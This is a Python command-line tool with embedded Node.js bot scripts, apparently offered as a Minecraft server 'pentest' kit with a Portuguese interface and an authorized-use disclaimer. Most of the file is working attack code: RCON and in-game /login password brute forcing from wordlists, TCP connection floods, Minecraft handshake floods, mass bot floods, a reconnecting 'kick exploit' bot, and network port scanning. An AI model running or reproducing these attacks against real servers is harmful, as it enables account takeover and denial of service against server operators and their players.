#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════
#   HSCONTROLMAIN v2.0  |  Criado por ZHendersonZ
#   Pentest para Minecraft — use só em servidores autorizados
# ══════════════════════════════════════════════════════════════

import os, sys, time, socket, re, datetime, threading
import subprocess, ipaddress, random, itertools, struct

def _install_deps():
    deps = {"mcstatus":"mcstatus","mcrcon":"mcrcon","requests":"requests",
            "colorama":"colorama","dnspython":"dns"}
    for pkg, mod in deps.items():
        try: __import__(mod)
        except ImportError:
            print(f"  [HSC] Instalando {pkg}...")
            subprocess.run([sys.executable,"-m","pip","install",pkg,"-q"],check=False)
_install_deps()

import requests, colorama
from colorama import Fore, Style
colorama.init(autoreset=True)

try:    from mcstatus import JavaServer, BedrockServer; MC_OK=True
except: MC_OK=False
try:    from mcrcon import MCRcon; RCON_OK=True
except: RCON_OK=False
try:    import dns.resolver; DNS_OK=True
except: DNS_OK=False

R=Fore.RED+Style.BRIGHT; G=Fore.GREEN+Style.BRIGHT
Y=Fore.YELLOW+Style.BRIGHT; C=Fore.CYAN+Style.BRIGHT
W=Fore.WHITE+Style.BRIGHT; DIM=Style.DIM; RST=Style.RESET_ALL

def info(m):  print(f"{R}[{W}HSC{R}]{RST} {C}{m}{RST}")
def ok(m):    print(f"{R}[{W}HSC{R}]{RST} {G}✔ {m}{RST}")
def err(m):   print(f"{R}[{W}HSC{R}]{RST} {R}✘ {m}{RST}")
def warn(m):  print(f"{R}[{W}HSC{R}]{RST} {Y}⚠ {m}{RST}")
def row(k,v): print(f"  {Y}├─ {W}{k:<18}{RST}{v}")
def sep():    print(f"  {DIM}{'─'*52}{RST}")

# ── Loading Animations ──────────────────────────────────────

def loading_dirt(label, duration=1.5):
    frames = [
        [" 01010101 "," 10DIRT01 "," 01BLOC10 "," 10101010 "],
        [" 10101010 "," 01DIRT10 "," 10BLOC01 "," 01010101 "],
        [" 00110011 "," 11DIRT00 "," 00BLOC11 "," 11001100 "],
        [" 11001100 "," 00DIRT11 "," 11BLOC00 "," 00110011 "],
    ]
    cycle = itertools.cycle(frames)
    end = time.time() + duration
    try:
        sys.stdout.write("\033[?25l")
        while time.time() < end:
            fr = next(cycle)
            bits = ''.join(random.choice('01') for _ in range(20))
            sys.stdout.write(f"\r  {C}{fr[0]}{RST}\n")
            sys.stdout.write(f"  {C}{fr[1][:3]}{Y}{fr[1][3:7]}{C}{fr[1][7:]}{RST}\n")
            sys.stdout.write(f"  {C}{fr[2][:3]}{Y}{fr[2][3:7]}{C}{fr[2][7:]}{RST}\n")
            sys.stdout.write(f"  {C}{fr[3]}{RST}\n")
            sys.stdout.write(f"  {W}{label}{RST} {DIM}{bits}{RST}  ")
            sys.stdout.flush()
            time.sleep(0.18)
            sys.stdout.write("\033[5A")
        for _ in range(5):
            sys.stdout.write(f"\r{' '*70}\n")
        sys.stdout.write("\033[5A\033[?25h")
        sys.stdout.flush()
    except:
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()

def loading_matrix(label, duration=1.5):
    end = time.time() + duration
    start = time.time()
    total = duration
    try:
        sys.stdout.write("\033[?25l")
        while time.time() < end:
            pct = min(int(((time.time()-start)/total)*100), 99)
            filled = int(40 * pct / 100)
            bar = f"{G}{'█'*filled}{DIM}{'░'*(40-filled)}{RST}"
            bits = ''.join(random.choice('01') for _ in range(16))
            sys.stdout.write(f"\r  [{bar}] {Y}{pct:>3}%{RST}  {DIM}{bits}{RST}  {C}{label}{RST}  ")
            sys.stdout.flush()
            time.sleep(0.06)
        sys.stdout.write(f"\r  {G}✔ {label}{RST}{' '*60}\n\033[?25h")
        sys.stdout.flush()
    except:
        sys.stdout.write("\033[?25h")

def loading_scan(label, duration=1.2):
    spin = itertools.cycle(['⣾','⣽','⣻','⢿','⡿','⣟','⣯','⣷'])
    bits = itertools.cycle(['0101','1010','0011','1100','0110','1001'])
    end = time.time() + duration
    try:
        sys.stdout.write("\033[?25l")
        while time.time() < end:
            sys.stdout.write(f"\r  {R}{next(spin)}{RST} {C}{label}{RST} {DIM}[{next(bits)}]{RST} {''.join(random.choice('01') for _ in range(18))}  ")
            sys.stdout.flush()
            time.sleep(0.07)
        sys.stdout.write(f"\r  {G}✔ {label}{RST}{' '*60}\n\033[?25h")
        sys.stdout.flush()
    except:
        sys.stdout.write("\033[?25h")

# ── Banner ───────────────────────────────────────────────────

def banner():
    os.system('cls' if os.name=='nt' else 'clear')
    print(f"""
{R} ██╗  ██╗███████╗ ██████╗ ██████╗ ███╗   ██╗████████╗██████╗  ██████╗ ██╗
{R} ██║  ██║██╔════╝██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██║
{R} ███████║███████╗██║     ██║   ██║██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║
{R} ██╔══██║╚════██║██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║
{R} ██║  ██║███████║╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║╚██████╔╝███████╗
{R} ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Y}          ███╗   ███╗ █████╗ ██╗███╗   ██╗
{Y}          ████╗ ████║██╔══██╗██║████╗  ██║
{Y}          ██╔████╔██║███████║██║██╔██╗ ██║
{Y}          ██║╚██╔╝██║██╔══██║██║██║╚██╗██║
{Y}          ██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
{Y}          ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{DIM}               v2.0 — Criado por {W}ZHendersonZ{DIM}
{DIM}          Ferramenta de Pentest para Minecraft
{DIM}     Use SOMENTE em servidores próprios ou autorizados
{RST}""")

def menu_help():
    groups = [
        ("── INFORMAÇÕES ──────────────────────────────────────────────────────────",[
            ("server",   "<ip:porta>",                       "Info completa do servidor"),
            ("ipinfo",   "<ip>",                             "Geolocalização + ISP + DNS"),
            ("uuid",     "<nick>",                           "UUID do player (Mojang API)"),
            ("dns",      "<dominio>",                        "Registros DNS completos"),
        ]),
        ("── ESCANEAMENTO ────────────────────────────────────────────────────────",[
            ("scan",     "<ip> <porta-porta>",               "Escaneia portas p/ Minecraft"),
            ("checker",  "<arquivo.txt>",                    "Checa lista de servidores"),
            ("portscan", "<ip> [porta-porta]",               "Scan TCP geral de portas"),
        ]),
        ("── RCON ────────────────────────────────────────────────────────────────",[
            ("rcon",     "<ip:porta> <senha>",               "Console RCON interativo"),
            ("rconbrute","<ip:porta> <lista.txt>",           "Brute force de senha RCON"),
        ]),
        ("── PLAYERS ─────────────────────────────────────────────────────────────",[
            ("playerlogs","<ip:porta>",                      "Monitora players em tempo real"),
        ]),
        ("── BOTS (requer Node.js) ───────────────────────────────────────────────",[
            ("kick",     "<ip:porta> <nick> <ver> [true]",   "Kick exploit (true=loop)"),
            ("login",    "<ip:porta> <nick> <ver> <lista>",  "Brute force /login"),
            ("connect",  "<ip:porta> <nick> <ver>",          "Bot interativo no servidor"),
            ("sendcmd",  "<ip:porta> <nick> <ver> <cmds>",   "Bot executa lista de comandos"),
            ("botflood", "<ip:porta> <qtd> <ver>",           "Flood de bots simultâneos"),
        ]),
        ("── STRESS TEST ─────────────────────────────────────────────────────────",[
            ("flood",    "<ip:porta> <threads> <segundos>",  "Flood de conexões TCP"),
            ("mcflood",  "<ip:porta> <threads> <segundos>",  "Flood de handshakes Minecraft"),
        ]),
        ("── SISTEMA ─────────────────────────────────────────────────────────────",[
            ("clear","","Limpa a tela"),("help","","Este menu"),("exit","","Sair"),
        ]),
    ]
    print()
    for title, cmds in groups:
        print(f"  {DIM}{title}{RST}")
        for c,a,d in cmds:
            print(f"  {C}{c:<12}{DIM}{a:<36}{RST}{d}")
        print()

# ── Utilitários ──────────────────────────────────────────────

def parse_host(s, dp=25565):
    if ':' in s:
        p=s.rsplit(':',1); return p[0], int(p[1])
    return s, dp

def flush_stdin():
    try:
        if os.name=='nt':
            import msvcrt
            while msvcrt.kbhit(): msvcrt.getch()
        else:
            import termios
            termios.tcflush(sys.stdin, termios.TCIFLUSH)
    except: pass

def find_exe(name):
    try:
        r=subprocess.run([name,"--version"],capture_output=True,text=True)
        if r.returncode==0: return name
    except FileNotFoundError: pass
    if os.name=='nt':
        for base in [r"C:\Program Files\nodejs",r"C:\Program Files (x86)\nodejs",
                     os.path.expandvars(r"%APPDATA%\npm"),
                     os.path.expandvars(r"%LOCALAPPDATA%\Programs\nodejs")]:
            for suffix in ([".cmd",""] if name=="npm" else [".exe",""]):
                c=os.path.join(base,name+suffix)
                if os.path.exists(c): return c
    return None

def install_mineflayer():
    npm=find_exe("npm")
    if not npm: err("npm não encontrado. Instale Node.js: https://nodejs.org"); return False
    loading_scan("Instalando mineflayer", 3.0)
    sd=os.path.dirname(os.path.abspath(__file__))
    r=subprocess.run([npm,"install","mineflayer","--prefix",sd],capture_output=True)
    subprocess.run([npm,"install","proxy-agent","--prefix",sd],capture_output=True)
    return r.returncode==0

def ensure_mineflayer():
    if not find_exe("node"): err("Node.js não instalado. Baixe em: https://nodejs.org"); return False
    sd=os.path.dirname(os.path.abspath(__file__))
    nm=os.path.join(sd,"node_modules","mineflayer")
    if not os.path.isdir(nm):
        if not install_mineflayer(): return False
    if not os.path.isdir(nm): err("Falha ao instalar mineflayer."); return False
    return True

def run_bot(js, js_args, interactive=False):
    node=find_exe("node")
    if not node: err("Node.js não encontrado."); return
    sd=os.path.dirname(os.path.abspath(__file__))
    tmp=os.path.join(sd,"_hsc_bot.js")
    with open(tmp,'w',encoding='utf-8') as f: f.write(js)
    try: subprocess.run([node,tmp]+js_args,cwd=sd)
    except KeyboardInterrupt: pass
    finally:
        flush_stdin()
        try: os.remove(tmp)
        except: pass

# ── Comandos ─────────────────────────────────────────────────

def cmd_server(args):
    if not args: return err("Uso: server <ip:porta>")
    if not MC_OK: return err("mcstatus não instalado.")
    host,port=parse_host(args[0])
    loading_dirt(f"Consultando {host}:{port}", 1.4)
    sep()
    try:
        srv=JavaServer(host,port,timeout=6); st=srv.status()
        q=None
        try: q=srv.query()
        except: pass
        motd=re.sub(r'§.','',str(st.description))
        row("Tipo","Java Edition"); row("MOTD",motd.strip())
        row("Versão",st.version.name); row("Protocol",str(st.version.protocol))
        row("Online",f"{st.players.online}/{st.players.max}")
        row("Ping",f"{round(st.latency,2)} ms")
        row("Players",", ".join(p.name for p in st.players.sample) if st.players.sample else "Ocultos")
        if q:
            row("Software",q.software.brand)
            if q.software.plugins:
                row("Plugins",str(len(q.software.plugins)))
                for p in q.software.plugins[:8]: print(f"        {DIM}» {p}{RST}")
        sep(); return ok("Servidor Java online!")
    except: pass
    try:
        srv=BedrockServer(host,port,timeout=6); st=srv.status()
        motd=re.sub(r'§.','',str(st.motd))
        row("Tipo","Bedrock Edition"); row("MOTD",motd.strip())
        row("Versão",st.version.name); row("Online",f"{st.players.online}/{st.players.max}")
        row("Gamemode",str(st.gamemode)); sep(); return ok("Servidor Bedrock online!")
    except: pass
    err(f"Servidor {host}:{port} offline.")

def cmd_scan(args):
    if len(args)<2: return err("Uso: scan <ip> <portaInicial-portaFinal>")
    try: sp,ep=map(int,args[1].split('-'))
    except: return err("Formato: 25560-25580")
    try: hosts=[str(h) for h in ipaddress.ip_network(args[0],strict=False).hosts()][:256]
    except: hosts=[args[0]]
    info(f"Escaneando {len(hosts)} host(s) | {sp}-{ep}")
    sep(); found=0; lock=threading.Lock()
    def probe(h,p):
        nonlocal found
        try:
            s=socket.socket(); s.settimeout(1.0)
            if s.connect_ex((h,p))!=0: s.close(); return
            s.close()
            if MC_OK:
                try:
                    st=JavaServer(h,p,timeout=2).status()
                    motd=re.sub(r'§.','',str(st.description)).strip()
                    with lock: found+=1; ok(f"{h}:{p}  {DIM}{motd[:40]} [{st.players.online}/{st.players.max}]{RST}")
                    return
                except: pass
            with lock: found+=1; ok(f"{h}:{p}  {DIM}aberta{RST}")
        except: pass
    ts=[threading.Thread(target=probe,args=(h,p),daemon=True) for h in hosts for p in range(sp,ep+1)]
    for t in ts: t.start()
    for t in ts: t.join()
    sep()
    ok(f"{found} servidor(es) encontrado(s)!") if found else warn("Nenhum encontrado.")

def cmd_portscan(args):
    if not args: return err("Uso: portscan <ip> [porta-porta]")
    host=args[0]
    sp,ep=(map(int,args[1].split('-')) if len(args)>1 else (1,1024))
    info(f"Port scan {host} ({sp}-{ep})..."); sep()
    open_p=[]; lock=threading.Lock()
    def probe(p):
        try:
            s=socket.socket(); s.settimeout(0.5)
            if s.connect_ex((host,p))==0:
                try: svc=socket.getservbyport(p,'tcp')
                except: svc="?"
                with lock: open_p.append(p); ok(f"Porta {Y}{p:<6}{RST}{DIM}[{svc}]{RST}")
            s.close()
        except: pass
    ts=[threading.Thread(target=probe,args=(p,),daemon=True) for p in range(sp,ep+1)]
    for t in ts: t.start()
    for t in ts: t.join()
    sep()
    info(f"Abertas: {', '.join(map(str,open_p))}" if open_p else "Nenhuma porta aberta.")

def cmd_checker(args):
    if not args: return err("Uso: checker <arquivo.txt>")
    if not os.path.exists(args[0]): return err(f"Arquivo não encontrado: {args[0]}")
    with open(args[0],'r',encoding='utf-8',errors='ignore') as f:
        svs=[l.strip() for l in f if l.strip()]
    info(f"Checando {len(svs)} servidor(es)..."); sep(); online=0
    for sv in svs:
        h,p=parse_host(sv)
        try:
            st=JavaServer(h,p,timeout=3).status()
            motd=re.sub(r'§.','',str(st.description)).strip()
            online+=1; ok(f"{h}:{p}  {DIM}{motd[:35]} [{st.players.online}/{st.players.max}]{RST}")
        except: print(f"  {R}✘{RST} {h}:{p}  {DIM}offline{RST}")
    sep(); info(f"Online: {G}{online}{RST} | Offline: {R}{len(svs)-online}{RST}")

def cmd_ipinfo(args):
    if not args: return err("Uso: ipinfo <ip>")
    loading_matrix(f"Consultando {args[0]}", 1.5)
    try:
        d=requests.get(f"http://ip-api.com/json/{args[0]}?fields=status,message,continent,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,query",timeout=8).json()
        if d.get('status')!='success': return err(f"IP inválido: {d.get('message','')}")
        sep()
        for k,v in [("IP",d.get('query')),("País",f"{d.get('country')} ({d.get('countryCode')})"),
                    ("Continente",d.get('continent')),("Região",d.get('regionName')),
                    ("Cidade",d.get('city')),("CEP",d.get('zip')),
                    ("Coordenadas",f"{d.get('lat')}, {d.get('lon')}"),
                    ("Timezone",d.get('timezone')),("ISP",d.get('isp')),
                    ("Org",d.get('org')),("AS",d.get('as')),("Reverso DNS",d.get('reverse'))]:
            row(k,v or 'N/A')
        try: row("PTR",socket.gethostbyaddr(args[0])[0])
        except: pass
        sep(); ok("Consulta concluída!")
    except Exception as e: err(str(e))

def cmd_uuid(args):
    if not args: return err("Uso: uuid <nick>")
    loading_scan(f"Buscando UUID de {args[0]}", 1.0)
    try:
        r=requests.get(f"https://api.mojang.com/users/profiles/minecraft/{args[0]}",timeout=8)
        if r.status_code==200:
            d=r.json(); uid=d.get('id','')
            fmt=f"{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}-{uid[20:]}"
            sep(); row("Nick",d.get('name')); row("UUID",fmt); row("UUID raw",uid); sep(); ok("UUID encontrado!")
        elif r.status_code==404: err(f"Player '{args[0]}' não existe.")
        else: err(f"API Mojang: HTTP {r.status_code}")
    except Exception as e: err(str(e))

def cmd_dns(args):
    if not args: return err("Uso: dns <dominio>")
    loading_scan(f"DNS {args[0]}", 1.2); sep()
    if DNS_OK:
        for rt in ['A','AAAA','MX','NS','TXT','CNAME','SRV']:
            try:
                for ans in dns.resolver.resolve(args[0],rt,lifetime=4): row(rt,str(ans))
            except: pass
    else:
        try:
            seen=set()
            for i in socket.getaddrinfo(args[0],None):
                a=i[4][0]
                if a not in seen: row("A/AAAA",a); seen.add(a)
        except Exception as e: err(str(e))
    sep(); ok("DNS concluído!")

def cmd_rcon(args):
    if len(args)<2: return err("Uso: rcon <ip:porta_rcon> <senha>")
    if not RCON_OK: return err("mcrcon não instalado.")
    host,port=parse_host(args[0],25575); pw=args[1]
    loading_scan(f"Conectando RCON {host}:{port}", 1.0)
    try:
        with MCRcon(host,pw,port=port,timeout=10) as mcr:
            ok(f"RCON conectado! {Y}.exit{RST} para sair."); sep()
            while True:
                try:
                    cmd=input(f"{R}[RCON]{RST} » ")
                    if cmd.strip()=='.exit': break
                    if not cmd.strip(): continue
                    resp=re.sub(r'§.','',mcr.command(cmd))
                    print(f"  {G}← {resp}{RST}" if resp else f"  {DIM}(sem resposta){RST}")
                except KeyboardInterrupt: break
    except ConnectionRefusedError: err("Conexão recusada. RCON está ativo?")
    except Exception as e:
        err("Senha incorreta!" if any(x in str(e).lower() for x in ["auth","password"]) else f"Erro: {e}")

def cmd_rconbrute(args):
    if len(args)<2: return err("Uso: rconbrute <ip:porta_rcon> <wordlist.txt>")
    if not RCON_OK: return err("mcrcon não instalado.")
    if not os.path.exists(args[1]): return err(f"Arquivo não encontrado: {args[1]}")
    host,port=parse_host(args[0],25575)
    with open(args[1],'r',encoding='utf-8',errors='ignore') as f:
        pws=[l.strip() for l in f if l.strip()]
    info(f"RCON Brute | {host}:{port} | {len(pws)} senhas"); sep()
    try:
        for i,pw in enumerate(pws,1):
            sys.stdout.write(f"\r  {DIM}[{i}/{len(pws)}]{RST} Tentando: {Y}{pw:<30}{RST}")
            sys.stdout.flush()
            try:
                with MCRcon(host,pw,port=port,timeout=4) as mcr:
                    mcr.command("list")
                print(); sep(); ok(f"SENHA ENCONTRADA: {G}{pw}{RST}"); return
            except ConnectionRefusedError:
                print(); err("Conexão recusada."); return
            except: continue
    except KeyboardInterrupt: print(); warn("Interrompido.")
    print(); sep(); warn("Senha não encontrada.")

def cmd_playerlogs(args):
    if not args: return err("Uso: playerlogs <ip:porta>")
    if not MC_OK: return err("mcstatus não instalado.")
    host,port=parse_host(args[0])
    info(f"Monitorando {C}{host}:{port}{RST} — Ctrl+C para parar"); sep()
    old=set(); lines=[]
    try:
        while True:
            try:
                st=JavaServer(host,port,timeout=4).status()
                now=datetime.datetime.now().strftime("%H:%M:%S")
                cur={p.name for p in st.players.sample} if st.players.sample else set()
                for p in cur-old:
                    m=f"[{now}] ENTROU: {p}"; print(f"  {G}🟢 {m}{RST}"); lines.append(m)
                for p in old-cur:
                    m=f"[{now}] SAIU: {p}"; print(f"  {R}🔴 {m}{RST}"); lines.append(m)
                old=cur; time.sleep(2)
            except:
                sys.stdout.write(f"\r  {DIM}Aguardando servidor...{RST}  "); sys.stdout.flush(); time.sleep(5)
    except KeyboardInterrupt:
        print(); sep()
        if lines:
            fn=f"playerlogs_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(fn,'w') as f: f.write('\n'.join(lines))
            ok(f"Log salvo: {fn}")
        warn("Encerrado.")

def cmd_flood(args):
    if len(args)<3: return err("Uso: flood <ip:porta> <threads> <segundos>")
    host,port=parse_host(args[0]); th=int(args[1]); dur=int(args[2])
    warn(f"TCP FLOOD: {host}:{port} | {th} threads | {dur}s — só no SEU servidor!")
    sep(); stop=threading.Event(); total=[0]; lock=threading.Lock()
    def worker():
        while not stop.is_set():
            try:
                s=socket.socket(); s.settimeout(2); s.connect((host,port))
                with lock: total[0]+=1
                time.sleep(0.01); s.close()
            except: pass
    ts=[threading.Thread(target=worker,daemon=True) for _ in range(th)]
    for t in ts: t.start()
    try:
        end=time.time()+dur
        while time.time()<end:
            sys.stdout.write(f"\r  {R}[FLOOD]{RST} Conexões: {G}{total[0]}{RST} | Restante: {Y}{int(end-time.time())}s{RST}  ")
            sys.stdout.flush(); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop.set()
    for t in ts: t.join(timeout=1)
    print(); sep(); ok(f"Concluído. Conexões totais: {G}{total[0]}{RST}")

def cmd_mcflood(args):
    if len(args)<3: return err("Uso: mcflood <ip:porta> <threads> <segundos>")
    host,port=parse_host(args[0]); th=int(args[1]); dur=int(args[2])
    warn(f"MC HANDSHAKE FLOOD: {host}:{port} | {th} threads | {dur}s")
    sep()
    def varint(v):
        out=b''
        while True:
            b=v&0x7F; v>>=7
            if v>0: b|=0x80
            out+=bytes([b])
            if v==0: break
        return out
    def hs():
        hb=host.encode()
        p=(varint(0x00)+varint(47)+varint(len(hb))+hb+struct.pack('>H',port)+varint(1))
        return varint(len(p))+p
    def sreq():
        p=varint(0x00); return varint(len(p))+p
    H=hs(); S=sreq(); stop=threading.Event(); total=[0]; lock=threading.Lock()
    def worker():
        while not stop.is_set():
            try:
                s=socket.socket(); s.settimeout(3); s.connect((host,port))
                s.sendall(H+S); s.recv(4096)
                with lock: total[0]+=1; s.close()
            except: pass
    ts=[threading.Thread(target=worker,daemon=True) for _ in range(th)]
    for t in ts: t.start()
    try:
        end=time.time()+dur
        while time.time()<end:
            sys.stdout.write(f"\r  {R}[MCFLOOD]{RST} Handshakes: {G}{total[0]}{RST} | Restante: {Y}{int(end-time.time())}s{RST}  ")
            sys.stdout.flush(); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop.set()
    for t in ts: t.join(timeout=1)
    print(); sep(); ok(f"Concluído. Handshakes: {G}{total[0]}{RST}")

# ── JS Scripts para bots ─────────────────────────────────────

KICK_JS="""const mineflayer=require('mineflayer');
const[host,port,username,version,loop]=process.argv.slice(2);
function connect(){
  const bot=mineflayer.createBot({host,port:parseInt(port),username,version,auth:'offline'});
  bot.on('error',()=>{});
  bot.on('end',()=>{if(loop==='true')setTimeout(connect,2000);});
  bot.on('login',()=>console.log('[HSC] Bot conectado: '+username));
}connect();"""

LOGIN_JS="""const mineflayer=require('mineflayer');
const fs=require('fs');
const[host,port,username,version,pwFile]=process.argv.slice(2);
const pws=fs.readFileSync(pwFile,'utf8').split('\\n').filter(p=>p.trim());
let idx=0;
function tryNext(){
  if(idx>=pws.length){console.log('[HSC] Nao encontrada.');process.exit(0);}
  const pw=pws[idx++].trim();
  process.stdout.write('\\r[HSC] Tentando: '+pw+'                    ');
  const bot=mineflayer.createBot({host,port:parseInt(port),username,version,auth:'offline'});
  bot.once('spawn',()=>{
    setTimeout(()=>bot.chat('/login '+pw),1000);
    setTimeout(()=>{console.log('\\n[HSC][SUCCESS] SENHA: '+pw);process.exit(0);},4000);
  });
  bot.on('kicked',()=>{bot.end();tryNext();});
  bot.on('error',()=>{bot.end();tryNext();});
}tryNext();"""

CONNECT_JS="""const mineflayer=require('mineflayer');
const readline=require('readline');
const[host,port,username,version]=process.argv.slice(2);
const bot=mineflayer.createBot({host,port:parseInt(port),username,version,auth:'offline'});
bot.on('login',()=>console.log('[HSC] Conectado como '+username+'. Digite (.exit para sair):'));
bot.on('message',msg=>console.log('[CHAT] '+msg.toString()));
bot.on('kicked',r=>console.log('[KICK] '+JSON.stringify(r)));
bot.on('error',e=>console.log('[ERROR] '+e.message));
const rl=readline.createInterface({input:process.stdin});
rl.on('line',line=>{if(line.trim()==='.exit'){bot.end();process.exit(0);}else bot.chat(line.trim());});"""

SENDCMD_JS="""const mineflayer=require('mineflayer');
const fs=require('fs');
const[host,port,username,version,cmdFile,loopMode]=process.argv.slice(2);
const cmds=fs.readFileSync(cmdFile,'utf8').split('\\n').filter(c=>c.trim());
function connect(){
  const bot=mineflayer.createBot({host,port:parseInt(port),username,version,auth:'offline'});
  bot.on('login',()=>{
    let i=0;
    const iv=setInterval(()=>{
      if(i>=cmds.length){clearInterval(iv);
        if(loopMode==='true'){bot.end();setTimeout(connect,3000);}
        else{bot.end();process.exit(0);}return;}
      bot.chat(cmds[i++]);
    },1500);
  });
  bot.on('error',()=>{});
}connect();"""

BOTFLOOD_JS="""const mineflayer=require('mineflayer');
const[host,port,count,version]=process.argv.slice(2);
console.log('[HSC] Criando '+count+' bots em '+host+':'+port);
for(let i=0;i<parseInt(count);i++){
  setTimeout(()=>{
    const nick='HSCBot'+Math.floor(Math.random()*99999);
    const bot=mineflayer.createBot({host,port:parseInt(port),username:nick,version,auth:'offline'});
    bot.on('login',()=>console.log('[BOT] Conectado: '+nick));
    bot.on('error',()=>{});
  },i*200);
}"""

def cmd_kick(args):
    if len(args)<3: return err("Uso: kick <ip:porta> <nick> <ver> [true]")
    if not ensure_mineflayer(): return
    host,port=parse_host(args[0]); loop=args[3].lower() if len(args)>3 else "false"
    info(f"Kick exploit {C}{host}:{port}{RST} | Nick: {Y}{args[1]}{RST} — Ctrl+C para parar")
    run_bot(KICK_JS,[host,str(port),args[1],args[2],loop])

def cmd_login(args):
    if len(args)<4: return err("Uso: login <ip:porta> <nick> <ver> <wordlist.txt>")
    if not ensure_mineflayer(): return
    if not os.path.exists(args[3]): return err(f"Arquivo não encontrado: {args[3]}")
    host,port=parse_host(args[0])
    info(f"Brute force /login {C}{host}:{port}{RST} | Nick: {Y}{args[1]}{RST}")
    run_bot(LOGIN_JS,[host,str(port),args[1],args[2],args[3]])

def cmd_connect(args):
    if len(args)<3: return err("Uso: connect <ip:porta> <nick> <ver>")
    if not ensure_mineflayer(): return
    host,port=parse_host(args[0])
    info(f"Conectando bot {Y}{args[1]}{RST} em {C}{host}:{port}{RST}")
    run_bot(CONNECT_JS,[host,str(port),args[1],args[2]],interactive=True)

def cmd_sendcmd(args):
    if len(args)<4: return err("Uso: sendcmd <ip:porta> <nick> <ver> <cmds.txt> [true]")
    if not ensure_mineflayer(): return
    if not os.path.exists(args[3]): return err(f"Arquivo não encontrado: {args[3]}")
    host,port=parse_host(args[0]); loop=args[4].lower() if len(args)>4 else "false"
    run_bot(SENDCMD_JS,[host,str(port),args[1],args[2],args[3],loop])

def cmd_botflood(args):
    if len(args)<3: return err("Uso: botflood <ip:porta> <quantidade> <ver>")
    if not ensure_mineflayer(): return
    host,port=parse_host(args[0])
    warn(f"Bot flood {host}:{port} | {args[1]} bots — SÓ no seu servidor!")
    run_bot(BOTFLOOD_JS,[host,str(port),args[1],args[2]])

# ── Main ─────────────────────────────────────────────────────

CMDS={"server":cmd_server,"scan":cmd_scan,"portscan":cmd_portscan,
      "checker":cmd_checker,"ipinfo":cmd_ipinfo,"uuid":cmd_uuid,"dns":cmd_dns,
      "rcon":cmd_rcon,"rconbrute":cmd_rconbrute,"playerlogs":cmd_playerlogs,
      "kick":cmd_kick,"login":cmd_login,"connect":cmd_connect,
      "sendcmd":cmd_sendcmd,"botflood":cmd_botflood,
      "flood":cmd_flood,"mcflood":cmd_mcflood}

def main():
    banner()
    info("Digite 'help' para ver todos os comandos.")
    print()
    while True:
        try: raw=input(f"{R}[HSC]{RST} » ").strip()
        except (KeyboardInterrupt,EOFError):
            print(); info("Saindo... Até logo, ZHendersonZ!"); sys.exit(0)
        if not raw: continue
        parts=raw.split(); cmd=parts[0].lower(); args=parts[1:]
        if cmd in ("exit","quit","sair"):
            info("Saindo... Até logo, ZHendersonZ!"); sys.exit(0)
        elif cmd=="help": menu_help()
        elif cmd=="clear": banner()
        elif cmd in CMDS:
            print()
            try: CMDS[cmd](args)
            except Exception as e: err(f"Erro inesperado: {e}")
            print()
        else: err(f"Comando desconhecido: '{cmd}'. Digite 'help'.")

if __name__=="__main__":
    main()
